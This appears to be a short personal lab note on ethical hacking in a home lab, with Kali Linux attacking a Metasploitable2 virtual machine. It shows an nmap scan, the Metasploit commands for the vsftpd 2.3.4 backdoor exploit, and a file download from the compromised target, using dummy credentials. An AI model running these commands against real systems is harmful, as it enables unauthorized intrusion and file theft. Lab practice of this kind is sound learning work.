
![[Pasted image 20250209200128.png]]

🔷 Step 7: Start Ethical Hacking!
Example 1: Scan Metasploitable with Nmap

From Kali, scan the target:

nmap -sV -A 192.168.56.101

Example 2: Exploit with Metasploit

Start Metasploit in Kali:

msfconsole

Use a known exploit:

use exploit/unix/ftp/vsftpd_234_backdoor
set TARGET 0
set RHOSTS 192.168.56.101
exploit


## Read files in the target machine

In Metasploitable2:

Create a txt file with the following content 
```
Super secret condifential content

username Hello34
pwd 123456789
```


Read file from Kali linux
![[Pasted image 20250209200514.png]]


## Send and receive files from the target machine using FTP
Send a file from Kali Linux


# Download files using metaexploitable

```
download /home/msfadmin/testfile.txt /home/yisus/Desktop
```

problem:

![[Pasted image 20250209204417.png]]